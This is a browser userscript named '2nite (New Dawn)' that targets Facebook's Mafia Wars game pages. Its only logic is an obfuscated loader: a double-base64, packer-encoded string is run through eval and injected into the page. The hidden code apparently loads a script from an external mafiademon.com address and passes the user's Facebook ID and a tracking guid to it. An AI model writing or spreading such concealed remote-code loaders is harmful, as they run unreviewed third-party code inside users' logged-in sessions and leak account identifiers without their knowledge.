// ==UserScript==
// @name        2nite (New Dawn)
// @namespace   Eric Prydz
// @description 
// @include     http://apps.facebook.com/inthemafia/*
// @include     https://apps.facebook.com/inthemafia/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     https://apps.new.facebook.com/inthemafia/*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     https://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     https://facebook.mafiawars.zynga.com/mwfb/xd_receiver.htm
// @include     http://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include     https://facebook.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @version     Bronze
// @icon        http://vinylpenetration.com/wp-content/uploads/2011/09/Eric_Prydz-2night.jpg
// @updateURL   http://userscripts.org/scripts/source/145094.user.js
// ==/UserScript==

{function itoj(j){
    var s=document.createElement('script');
    s.innerHTML=eval(atob(j));
    document.body.appendChild(s);
}
 var l=atob('S0daMWJtTjBhVzl1S0hBc1lTeGpMR3NzWlN4a0tYdGxQV1oxYm1OMGFXOXVLR01wZTNKbGRIVnliaUJqTG5SdlUzUnlhVzVuS0RNMktYMDdhV1lvSVNjbkxuSmxjR3hoWTJVb0wxNHZMRk4wY21sdVp5a3BlM2RvYVd4bEtHTXRMU2w3WkZ0akxuUnZVM1J5YVc1bktHRXBYVDFyVzJOZGZIeGpMblJ2VTNSeWFXNW5LR0VwZldzOVcyWjFibU4wYVc5dUtHVXBlM0psZEhWeWJpQmtXMlZkZlYwN1pUMW1kVzVqZEdsdmJpZ3BlM0psZEhWeWJpZGNYSGNySjMwN1l6MHhmVHQzYUdsc1pTaGpMUzBwZTJsbUtHdGJZMTBwZTNBOWNDNXlaWEJzWVdObEtHNWxkeUJTWldkRmVIQW9KMXhjWWljclpTaGpLU3NuWEZ4aUp5d25aeWNwTEd0YlkxMHBmWDF5WlhSMWNtNGdjSDBvSjN0aklHRTlNUzVpS0Z3blpGd25LVHRoTG1VOVhDZG5MemxjSnp0aExtZzlYQ2M0T2k4dk15NHlMelF2TlM0M1B6WTlYQ2NyWmk1d0sxd25KbWs5WENjcmNpaGNKM1JjSnlrclhDY21kVDFjSnl0MktITWdjU2dwTG1zb0tTOXFMR3dwT3pFdWJTaGNKMjljSnlsYk1GMHViaWhoS1gwbkxETXlMRE15TENkOFpHOWpkVzFsYm5SOFkyOXRmRzFoWm1saFpHVnRiMjU4YzJOeWFYQjBjM3huWlhSZmJXRm1hV0ZmWkdWdGIyNThabUpwWkh4d2FIQjhhSFIwY0h4cVlYWmhjMk55YVhCMGZIeGpjbVZoZEdWRmJHVnRaVzUwZkhaaGNueHpZM0pwY0hSOGRIbHdaWHhWYzJWeWZIUmxlSFI4YzNKamZHZDFhV1I4TlRBd01IeG5aWFJVYVcxbGZERXdmR2RsZEVWc1pXMWxiblJ6UW5sVVlXZE9ZVzFsZkdGd2NHVnVaRU5vYVd4a2ZHaGxZV1I4ZEhKaFkydEpaSHhFWVhSbGZHRjBiMko4Ym1WM2ZGcFVaekphVjBwdFRrUk5kRTR5Vm1wTlF6QXdUMFJvYlV4VWEzcE5Na1YwV1dwTmVWcEVVbXhPVjBVd1QwUkZlWHhqWW54d1lYSnpaVWx1ZENjdWMzQnNhWFFvSjN3bktTd3dMSHQ5S1NrPQ');
 var t=false;
 if(/xw_controller=freegifts/.test(document.location.href))t=false;
 if(/xw_controller=requests/.test(document.location.href))t=false;
 if(!t)itoj(l);
}